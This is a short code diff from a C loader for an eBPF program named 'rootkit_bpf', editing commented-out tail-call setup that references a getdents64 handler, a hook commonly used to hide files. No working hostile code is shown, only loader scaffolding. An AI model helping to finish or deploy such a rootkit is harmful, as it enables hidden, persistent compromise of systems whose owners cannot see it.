@@ -32,10 +32,11 @@ int main(int argc, char *argv[]) {
         goto cleanup;
     }
 
-    /* Setup maps for tail calls */
-    //TODO: continue here at 2025-03-18,come on, you can do it!
-    //int index = 1;
-    //int prog_fd = bpf_program__fd(skel->progs.handle_getdents64_enter);
+    /*
+    int index = 1;
+    int prog_fd = bpf_program__fd(skel->progs.raw_tracepoint__sys_enter);
+    int ret = bpf_map__update_elem();
+    */
 
     /* Attach tracepoint handler */
     err = rootkit_bpf__attach(skel);
